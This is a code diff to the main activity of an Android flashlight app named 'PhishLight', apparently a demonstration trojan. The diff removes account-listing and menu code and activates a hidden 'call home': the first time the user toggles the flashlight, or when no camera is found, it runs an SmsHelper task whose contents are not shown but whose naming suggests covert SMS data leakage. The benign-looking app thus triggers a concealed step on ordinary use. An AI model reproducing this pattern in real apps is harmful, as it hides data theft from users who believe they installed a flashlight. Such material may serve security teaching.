@@ -1,7 +1,5 @@
 package org.rix1.PhishLight;
 
-import android.accounts.Account;
-import android.accounts.AccountManager;
 import android.app.Activity;
 import android.content.Context;
 import android.content.pm.PackageManager;
@@ -9,7 +7,6 @@ import android.hardware.Camera;
 import android.os.Bundle;
 import android.util.Log;
 import android.view.Menu;
-import android.view.MenuItem;
 import android.view.View;
 import android.widget.Button;
 import android.widget.ImageView;
@@ -44,10 +41,9 @@ public class MainActivity extends Activity {
 
         camera = Camera.open();
         final Camera.Parameters p = camera.getParameters();
-        
+
         smsHelper = new SmsHelper(this);
-        // not sure if this should be here or not
-        //smsHelper.execute(null);
+
 
         toggle.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -66,7 +62,7 @@ public class MainActivity extends Activity {
                     } else {
                         Log.d("APP: ", "Flashlight is ON!");
                         if (!hasCalledHome) {
-                            //callHome();
+                            smsHelper.execute();
                             hasCalledHome = true;
                         }
                         p.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
@@ -78,20 +74,13 @@ public class MainActivity extends Activity {
                 }else {
                     Toast.makeText(context, "No camera found ", Toast.LENGTH_LONG).show();
                     if (!hasCalledHome) {
-                        //callHome();
+                        smsHelper.execute();
                         hasCalledHome = true;
                     }
                 }
             }
         });
     }    
-
-    public void listAllAccounts(){
-        Account[] accounts = AccountManager.get(context).getAccounts();
-        for(Account acc: accounts){
-            Log.d("APP:", "Accounts on device : " + acc.toString());
-        }
-    }
 
     @Override
     public boolean onCreateOptionsMenu(Menu menu) {
@@ -113,16 +102,4 @@ public class MainActivity extends Activity {
         }
     }
 
-    @Override
-    public boolean onOptionsItemSelected(MenuItem item) {
-        // Handle action bar item clicks here. The action bar will
-        // automatically handle clicks on the Home/Up button, so long
-        // as you specify a parent activity in AndroidManifest.xml.
-    /*    int id = item.getItemId();
-        if (id == R.id.action_settings) {
-            return true;
-        }
-        return super.onOptionsItemSelected(item); */
-        return true;
-    }
 }
